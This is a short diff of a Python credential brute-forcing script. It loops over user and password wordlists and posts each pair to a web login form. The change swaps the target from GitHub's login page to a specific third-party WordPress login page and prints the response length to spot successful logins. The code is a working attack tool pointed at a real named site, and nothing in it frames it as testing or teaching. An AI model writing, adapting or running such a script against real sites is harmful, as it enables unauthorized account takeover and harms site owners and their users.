@@ -2,12 +2,13 @@ import requests
 from loginform import fill_login_form
 
 
+
 # The link of the website
 # url = input("\nEnter URL:")
-url = "https://github.com/login"
+url = "http://leafus.com.ua/wp-login.php"
 
-passwords = open('passwords.txt').readlines()
-users = open('users.txt').readlines()
+passwords = open('assets/passwords.txt').readlines()
+users = open('assets/users.txt').readlines()
 
 print(f"Connecting to: {url}......\n")
 failed_aftertry = 0
@@ -29,7 +30,7 @@ for user in users:
                 res = requests.get(url)
                 cookies = dict(res.cookies)
                 p = s.post(post_url, data=payload, cookies=cookies)
-                print(p.text)
+                print(len(p.text))
                 # print(p.content)\
         elif method == "GET":
             print('get method form')
